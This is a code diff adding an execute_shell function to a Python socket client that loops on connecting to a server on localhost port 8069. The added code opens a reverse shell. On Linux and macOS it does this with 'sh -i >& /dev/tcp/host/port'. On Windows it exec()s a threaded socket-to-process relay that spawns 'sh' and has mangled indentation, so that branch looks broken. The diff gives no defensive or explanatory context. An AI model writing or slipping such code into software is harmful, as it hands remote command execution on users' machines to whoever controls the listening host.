@@ -12,6 +12,46 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 host = 'localhost'
 port = 8069
 
+def execute_shell(host, port):
+    platform = sys.platform
+    if platform == 'linux' or platform == 'linux2':
+        os.system(f'sh -i >& /dev/tcp/{host}/{port} 0>&1')
+    elif platform == 'Windows' or platform == 'win32':
+        exec(f'''
+import os,socket,subprocess,threading;
+def s2p(s, p):
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
+
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("{host}",{port}))
+
+p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+s2p_thread = threading.Thread(target=s2p, args=[s, p])
+s2p_thread.daemon = True
+s2p_thread.start()
+
+                            p2s_thread = threading.Thread(target=p2s, args=[s, p])
+                            p2s_thread.daemon = True
+                            p2s_thread.start()
+                    
+                            try:
+                                p.wait()
+                            except KeyboardInterrupt:
+                                s.close()
+        ''')
+    elif platform == 'darwin':
+        os.system(f'sh -i >& /dev/tcp/{host}/{port} 0>&1')
+
+
 while True:
     try:
         # Attempt to connect to the server
